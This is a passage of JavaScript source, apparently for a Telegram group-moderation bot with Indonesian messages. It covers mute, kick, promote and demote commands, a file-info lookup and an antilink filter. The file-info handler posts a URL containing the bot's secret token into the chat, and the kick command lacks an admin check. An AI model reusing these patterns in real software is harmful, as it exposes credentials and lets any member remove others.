  if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
  if (!ctx.message.reply_to_message) 
    return ctx.reply("⚠️ Reply pesan target!");

  const userId = ctx.message.reply_to_message.from.id;

  await ctx.restrictChatMember(userId, {
    permissions: {
      can_send_messages: false
    }
  });

  ctx.reply("🔇 Mampus di mute 😂");
});

bot.command('unmute', async (ctx) => {
  if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
  if (!ctx.message.reply_to_message) 
    return ctx.reply("⚠️ Reply pesan target!");

  const userId = ctx.message.reply_to_message.from.id;

  await ctx.restrictChatMember(userId, {
    permissions: {
      can_send_messages: true
    }
  });

  ctx.reply("Okelah dia boleh chat lagi");
});
// ===== KICK =====
bot.command("kick", async (ctx) => {

    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan member yang mau dikick.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.kickChatMember(userId);
        ctx.reply("✅ Member berhasil dikick.");
    } catch {
        ctx.reply("❌ Gagal kick member.");
    }
});

// ===== PROMOTE =====
bot.command("promote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan member.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.promoteChatMember(userId, {
            can_change_info: true,
            can_delete_messages: true,
            can_invite_users: true,
            can_restrict_members: true,
            can_pin_messages: true,
            can_promote_members: false,
        });

        ctx.reply("✅ Berhasil promote.");
    } catch {
        ctx.reply("❌ Gagal promote.");
    }
});

// ===== DEMOTE =====
bot.command("demote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan admin.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.promoteChatMember(userId, {
            can_change_info: false,
            can_delete_messages: false,
            can_invite_users: false,
            can_restrict_members: false,
            can_pin_messages: false,
            can_promote_members: false,
        });

        ctx.reply("✅ Admin diturunkan.");
    } catch {
        ctx.reply("❌ Gagal demote.");
    }
});
bot.command("fileinfo", (ctx) => {
  ctx.reply("📂 Send the file you want to check!");
});
async function handleFile(ctx, type) {
  const chatId = ctx.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = ctx.message.document.file_id;
    fileName = ctx.message.document.file_name;
  } else if (type === "photo") {
    const photo = ctx.message.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = ctx.message.video.file_id;
    fileName = ctx.message.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = ctx.message.audio.file_id;
    fileName = ctx.message.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *File Information*
━━━━━━━━━━━━━━━━
📄 Name: ${fileName}
📏 Size: ${fileSize}
🧩 Extension: ${fileExt || "-"}
🔗 URL: [Click here](${fileUrl})
`;

    ctx.reply(info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Fileinfo error:", err);
    ctx.reply("⚠️ Failed to get file info. Please resend the file.");
  }
}

bot.on("document", (ctx) => handleFile(ctx, "document"));
bot.on("photo", (ctx) => handleFile(ctx, "photo"));
bot.on("video", (ctx) => handleFile(ctx, "video"));
bot.on("audio", (ctx) => handleFile(ctx, "audio"));

function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}
bot.command("antilink", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const status = (args[0] || "").toLowerCase();

  if (!["on", "off"].includes(status)) {
    return ctx.reply("⚠️ Gunakan:\n/antilink on\n/antilink off");
  }

  if (status === "on") {
    antiLink = true;
    return ctx.reply("✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    return ctx.reply("⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("text", async (ctx) => {
  if (!antiLink) return;

  const text = ctx.message.text;
  if (linkPattern.test(text)) {
    try {
      await ctx.deleteMessage();
      await ctx.reply("🚫 Pesan berisi link telah dihapus otomatis!");
    } catch (e) {
      // ignore error (mis. bot bukan admin)
    }
  }
});
// ===== SIMPAN MEMBER YANG CHAT =====
bot.on("message", (ctx) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
        const chatId = ctx.chat.id;
        if (!groupMembers[chatId]) groupMembers[chatId] = new Map();

        groupMembers[chatId].set(ctx.from.id, ctx.from);
    }
});

///////////////////[FUNC]////////////////

// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();